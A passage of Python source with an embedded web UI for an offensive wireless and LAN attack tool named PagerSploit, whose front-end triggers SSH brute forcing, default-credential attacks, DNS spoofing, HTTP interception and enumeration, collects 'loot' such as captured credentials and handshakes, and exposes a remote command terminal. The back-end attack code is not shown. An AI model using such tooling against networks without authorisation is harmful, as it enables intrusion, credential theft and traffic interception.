  g('os-status').textContent='Detecting...';await api('/api/lan/os_detect','POST',{target:t});
  pollUntilIdle(async(s)=>{g('os-status').textContent=s?s.module_status:'';
    const d=await api('/api/data/os_detect');if(d&&d.raw)g('os-out').textContent=d.raw;},60);}
async function doBanner(){const t=gv('banner-target');if(!t)return alert('Target required');
  g('banner-status').textContent='Grabbing...';await api('/api/lan/banner_grab','POST',{target:t});
  pollUntilIdle(async(s)=>{g('banner-status').textContent=s?s.module_status:'';
    const d=await api('/api/data/banners');
    if(d&&d.length)g('banner-body').innerHTML=d.map(b=>'<tr><td>'+b.port+'</td><td style="font-size:11px">'+esc(b.banner)+'</td></tr>').join('');},30);}
async function doCreds(){const t=gv('cred-target');if(!t)return alert('Target required');
  await api('/api/lan/default_creds','POST',{target:t});}
async function doSsh(){const t=gv('ssh-target');if(!t)return alert('Target required');
  await api('/api/lan/ssh_brute','POST',{target:t,port:gv('ssh-port')});}
async function doSmb(){const t=gv('smb-target');if(!t)return alert('Target required');
  g('smb-status').textContent='Enumerating...';await api('/api/lan/smb_enum','POST',{target:t});
  pollUntilIdle(async(s)=>{g('smb-status').textContent=s?s.module_status:'';
    const d=await api('/api/data/smb_enum');if(d&&d.raw)g('smb-out').textContent=d.raw;},60);}
async function doSnmp(){const t=gv('snmp-target');if(!t)return alert('Target required');
  g('snmp-status').textContent='Walking...';await api('/api/lan/snmp_walk','POST',{target:t,community:gv('snmp-comm')});
  pollUntilIdle(async(s)=>{g('snmp-status').textContent=s?s.module_status:'';
    const d=await api('/api/data/snmp_out');if(d)g('snmp-out').textContent=d;},60);}
async function doSsl(){const t=gv('ssl-target');if(!t)return alert('Target required');
  g('ssl-status').textContent='Grabbing...';await api('/api/lan/ssl_cert','POST',{target:t,port:gv('ssl-port')});
  pollUntilIdle(async(s)=>{g('ssl-status').textContent=s?s.module_status:'';
    const d=await api('/api/data/ssl_cert');if(d)g('ssl-out').textContent=JSON.stringify(d,null,2);},30);}
async function doMdns(){await api('/api/lan/mdns','POST',{});
  pollUntilIdle(async()=>{const d=await api('/api/data/mdns_devices');
    if(d&&d.length)g('mdns-body').innerHTML=d.map(x=>'<tr><td>'+x.ip+'</td><td>'+x.protocol+'</td><td>'+esc(x.server)+'</td></tr>').join('');},15);}
async function doDnsSpoof(){const domain=gv('dns-domain');const r=gv('dns-redirect');
  if(!domain||!r)return alert('Domain and redirect required');
  const res=await api('/api/lan/dns_spoof','POST',{domain,redirect:r});alert(res.status||res.error);}
async function doHttpInt(){await api('/api/lan/http_intercept','POST',{iface:gv('http-iface')});}
async function doMac(){const m=gv('mac-addr');if(!m)return alert('MAC required');
  g('mac-result').textContent='Looking up...';await api('/api/osint/mac','POST',{mac:m});
  pollUntilIdle(async()=>{const d=await api('/api/data/mac_lookup');g('mac-result').textContent=d?d.mac+'\nVendor: '+d.vendor:'No result';},15);}
async function macFromScan(){if(!scanResults.length)return alert('Run scan first');
  const results=[];
  for(const a of scanResults.slice(0,5)){await api('/api/osint/mac','POST',{mac:a.bssid});
    await new Promise(r=>setTimeout(r,1500));const d=await api('/api/data/mac_lookup');
    if(d)results.push(d.mac+': '+d.vendor);}
  g('mac-result').textContent=results.join('\n');}
async function doGeo(){const ip=gv('geo-ip');if(!ip)return alert('IP required');
  g('geo-result').textContent='Looking up...';await api('/api/osint/ipgeo','POST',{ip});
  pollUntilIdle(async()=>{const d=await api('/api/data/ip_geo');
    if(d)g('geo-result').textContent=['IP: '+(d.query||d.ip),'Country: '+(d.country||'?'),
      'Region: '+(d.regionName||'?'),'City: '+(d.city||'?'),'ISP: '+(d.isp||'?'),
      'Org: '+(d.org||'?'),'AS: '+(d.as||'?')].join('\n');},15);}
async function doWhois(){const t=gv('whois-target');if(!t)return alert('Target required');
  g('whois-status').textContent='Querying...';await api('/api/osint/whois','POST',{target:t});
  pollUntilIdle(async(s)=>{g('whois-status').textContent=s?s.module_status:'';
    const loot=await api('/api/loot');const f=loot.find(l=>l.name.startsWith('whois_'));
    if(f){const r=await fetch('/api/loot/download/'+encodeURIComponent(f.name));g('whois-out').textContent=await r.text();}},20);}
async function doDnsEnum(){const d=gv('dns-enum-d');if(!d)return alert('Domain required');
  g('dns-enum-status').textContent='Enumerating...';await api('/api/osint/dns_enum','POST',{domain:d});
  pollUntilIdle(async(s)=>{g('dns-enum-status').textContent=s?s.module_status:'';
    const data=await api('/api/data/dns_enum');if(data&&data.records)g('dns-enum-out').textContent=JSON.stringify(data.records,null,2);},30);}
async function doDnsBrute(){const d=gv('dnsb-d');if(!d)return alert('Domain required');
  g('dnsb-status').textContent='Bruteforcing...';await api('/api/osint/dns_brute','POST',{domain:d});
  pollUntilIdle(async(s)=>{g('dnsb-status').textContent=s?s.module_status:'';
    const data=await api('/api/data/dns_brute');
    if(data&&data.length)g('dnsb-body').innerHTML=data.map(r=>'<tr><td>'+r.subdomain+'</td><td style="color:var(--green)">'+r.ip+'</td></tr>').join('');
    else g('dnsb-body').innerHTML='<tr><td colspan="2" style="color:var(--dim)">None found</td></tr>';},60);}
async function doWifiGeo(){if(!scanResults.length)return alert('Run AP scan first');
  const bssids=scanResults.slice(0,10).map(a=>a.bssid);
  g('wgeo-result').textContent='Querying Mozilla Location Service...';
  await api('/api/osint/wifi_geo','POST',{bssids});
  pollUntilIdle(async()=>{const d=await api('/api/data/wifi_geo');
    if(d&&d.location)g('wgeo-result').textContent='Lat: '+d.location.lat+'\nLng: '+d.location.lng+'\nAccuracy: '+d.accuracy+'m\n\nhttps://maps.google.com/?q='+d.location.lat+','+d.location.lng;
    else g('wgeo-result').textContent=d?(d.error||JSON.stringify(d)):'No result';},15);}
async function doHttpFp(){const t=gv('hfp-target');if(!t)return alert('Target required');
  g('hfp-status').textContent='Scanning...';await api('/api/osint/http_headers','POST',{target:t,port:parseInt(gv('hfp-port'))||80});
  pollUntilIdle(async(s)=>{g('hfp-status').textContent=s?s.module_status:'';
    const d=await api('/api/data/http_headers');
    if(d)g('hfp-out').textContent='Status: '+(d.status||'?')+'\nTech: '+(d.tech||[]).join(', ')+'\n\nHeaders:\n'+JSON.stringify(d.headers,null,2);},20);}
async function doSysRecon(){g('sr-status').textContent='Running...';
  await api('/api/osint/sysrecon','POST',{});
  pollUntilIdle(async(s)=>{g('sr-status').textContent=s?s.module_status:'';
    const d=await api('/api/data/sysrecon');
    if(d){g('sr-iface').textContent=(d.interfaces||'')+(d.iwconfig?'\n'+d.iwconfig:'');
      g('sr-clients').textContent=(d.br_lan_clients||'')+(d.br_evil_clients?'\n'+d.br_evil_clients:'');
      g('sr-leases').textContent=d.dhcp_leases||'No leases';g('sr-nft').textContent=d.nftables||'';}},20);}
async function stop(name){await api('/api/stop','POST',{module:name});}
async function stopAll(){if(!confirm('Stop all modules?'))return;await api('/api/stop_all','POST',{});}
async function loadLoot(){const loot=await api('/api/loot');const tbody=g('loot-body');
  if(!Array.isArray(loot)||!loot.length){tbody.innerHTML='<tr><td colspan="5" style="color:var(--dim)">No loot</td></tr>';return;}
  const cats={handshakes:'tag-blue',credentials:'tag-red',scans:'tag-green',pmkid:'tag-yellow'};
  tbody.innerHTML=loot.map(l=>'<tr><td>'+esc(l.name)+'</td><td><span class="tag '+(cats[l.category]||'tag-blue')+'">'+l.category+'</span></td><td>'+(l.size/1024).toFixed(1)+'KB</td><td style="color:var(--dim)">'+l.modified+'</td><td><a href="/api/loot/download/'+encodeURIComponent(l.name)+'" style="color:var(--blue)">Download</a></td></tr>').join('');}

// ── Terminal ──────────────────────────────────────────────────────────────
let termLive=true, termLastLog=0;
function termEl(){return document.getElementById('term-out');}
function termWrite(text, col){
  const el=termEl(); if(!el)return;
  const span=document.createElement('span');
  if(col)span.style.color=col;
  span.textContent=text+'\n';
  el.appendChild(span);
  el.scrollTop=el.scrollHeight;
}
function termClear(){const el=termEl();if(el)el.innerHTML='';termLastLog=0;}
function termToggleLive(){termLive=!termLive;const s=document.getElementById('term-live-status');if(s)s.textContent=termLive?'ON':'OFF';}
async function termKillAll(){await api('/api/stop_all','POST',{});termWrite('[killed all jobs]','#ff8c00');}
async function termRun(){
  const inp=document.getElementById('term-input');
  const cmd=inp?inp.value.trim():'';
  if(!cmd)return;
  if(inp)inp.value='';
  termWrite('$ '+cmd,'#00ffb4');
  const r=await api('/api/term/exec','POST',{cmd});
  if(!r){termWrite('[no response]','#ff2828');return;}
  if(r.error&&!r.output){termWrite('ERROR: '+r.error,'#ff2828');return;}
  if(r.output){
    const lines=r.output.split('\n');
    lines.forEach(l=>{ if(l!==undefined) termWrite(l, r.rc!==0?'#ffaa44':'#c0c0c0'); });
  }
  if(r.rc!==0) termWrite('[exit '+r.rc+']','#ff8c00');
}
function termInjectLog(entries){
  if(!termLive||!entries||!entries.length)return;
  const newEntries=entries.slice(termLastLog);
  if(!newEntries.length)return;
  termLastLog=entries.length;
  const cols={success:'#00ff50',error:'#ff2828',warn:'#ff8c00',info:'#555'};
  newEntries.forEach(e=>{
    termWrite('['+e.time+'] '+e.msg, cols[e.level]||'#aaa');
  });
}
// Hook into pollState to feed live log into terminal
const _origPollState=pollState;
async function pollState(){
  const s=await api('/api/state');
  if(s&&!s.error){
    document.getElementById('sb-mod').textContent=s.active_module;
    document.getElementById('sb-status').textContent=s.module_status;
    document.getElementById('tb-loot').textContent=s.loot_count;
    document.getElementById('d-mod').textContent=s.active_module;
    document.getElementById('d-status').textContent=s.module_status;
    document.getElementById('d-loot').textContent=s.loot_count;
    document.getElementById('d-jobs').textContent=(s.jobs||[]).length;
    document.getElementById('d-ip').textContent='http://'+s.server_ip+':'+s.server_port;
    document.getElementById('tb-ip').textContent=s.server_ip+':'+s.server_port;}
  const lg=await api('/api/log');
  if(lg&&!lg.error){
    const el=document.getElementById('log-entries');
    el.innerHTML=lg.slice(-60).map(l=>'<span class="log-'+l.level+'">['+l.time+'] '+esc(l.msg)+'</span><br>').join('');
    el.scrollTop=el.scrollHeight;
    termInjectLog(lg);
  }
  const sc=await api('/api/scans');
  if(sc&&Array.isArray(sc)&&sc.length){scanResults=sc;renderScan(sc);}
  const hosts=await api('/api/hosts');
  if(hosts&&Array.isArray(hosts)&&hosts.length)renderArp(hosts);}
// Terminal input: enter key
  // add terminal to TITLES
});
// SSE stream for shell exec output
setInterval(pollState,2000);pollState();
</script></body></html>'''


# ── Main ──────────────────────────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument('--server-ip',   default='172.16.52.1')
    p.add_argument('--server-port', default='8080')
    p.add_argument('--payload-dir', required=True)
    return p.parse_args()

def run():
    args = parse_args()
    with STATE_LOCK:
        STATE['server_ip']   = args.server_ip
        STATE['server_port'] = args.server_port
        STATE['payload_dir'] = args.payload_dir

    for d in ['handshakes','credentials','scans','pmkid']:
        os.makedirs(loot_path(d), exist_ok=True)

    log(f'PagerSploit v2.0 on {args.server_ip}:{args.server_port}')
    stop_event = threading.Event()

    server = ThreadedHTTPServer(('0.0.0.0', int(args.server_port)), APIHandler)
    server.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.timeout = 2
    threading.Thread(target=server.serve_forever, daemon=True).start()
    log(f'Web UI: http://{args.server_ip}:{args.server_port}', 'success')

    with Pager() as p:
        pager_display_loop(p, stop_event)

    log('Shutting down...')
    with STATE_LOCK:
        for ev in list(STATE['stop_events'].values()): ev.set()
        for proc in list(STATE['jobs'].values()):
            if hasattr(proc,'terminate'):
                try: proc.terminate()
                except: pass
    server.shutdown()

if __name__ == '__main__':
    try:
        run()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f'FATAL: {e}', flush=True)
        import traceback; traceback.print_exc()
        sys.exit(1)
